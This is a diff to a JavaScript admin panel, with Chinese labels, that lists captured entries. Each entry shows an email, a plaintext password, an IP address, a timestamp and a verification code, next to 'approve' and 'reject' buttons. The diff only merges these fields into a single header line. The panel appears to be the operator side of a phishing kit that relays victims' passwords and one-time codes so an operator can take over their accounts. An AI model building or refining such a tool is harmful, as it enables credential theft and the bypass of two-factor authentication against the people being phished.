@@ -287,10 +287,7 @@ class AdminApp {
             <div class="request-item" data-id="${request.id}">
                 <div class="request-header">
                     <div class="request-info">
-                        <h4>${request.email}</h4>
-                        <p>密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong></p>
-                        <p>IP地址: ${request.ip_address}</p>
-                        <p>登录时间: ${new Date(request.login_time).toLocaleString()}</p>
+                        <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
                     </div>
                     <div class="request-actions">
                         <button class="approve-btn" onclick="adminApp.approveLogin(${request.id}, true)">通过</button>
@@ -330,10 +327,7 @@ class AdminApp {
             <div class="request-item" data-id="${request.id}">
                 <div class="request-header">
                     <div class="request-info">
-                        <h4>${request.email}</h4>
-                        <p>密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong></p>
-                        <p>验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong></p>
-                        <p>提交时间: ${new Date(request.submitted_at).toLocaleString()}</p>
+                        <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong> | 验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong> | 时间: ${new Date(request.submitted_at).toLocaleString()}</h4>
                     </div>
                     <div class="request-actions">
                         <button class="approve-btn" onclick="adminApp.approveVerification(${request.id}, true)">通过</button>
@@ -404,10 +398,7 @@ class AdminApp {
         requestElement.innerHTML = `
             <div class="request-header">
                 <div class="request-info">
-                    <h4>${request.email}</h4>
-                    <p>密码: <strong style="color: #0071e3; font-family: monospace;">${request.password}</strong></p>
-                    <p>IP地址: ${request.ip_address}</p>
-                    <p>登录时间: ${new Date(request.login_time).toLocaleString()}</p>
+                    <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
                 </div>
                 <div class="request-actions">
                     <button class="approve-btn" onclick="adminApp.approveLogin(${request.id}, true)">通过</button>
@@ -483,10 +474,7 @@ class AdminApp {
         requestElement.innerHTML = `
             <div class="request-header">
                 <div class="request-info">
-                    <h4>${request.email}</h4>
-                    <p>密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong></p>
-                    <p>验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong></p>
-                    <p>提交时间: ${new Date(request.submitted_at).toLocaleString()}</p>
+                    <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong> | 验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong> | 时间: ${new Date(request.submitted_at).toLocaleString()}</h4>
                 </div>
                 <div class="request-actions">
                     <button class="approve-btn" onclick="adminApp.approveVerification(${request.id}, true)">通过</button>
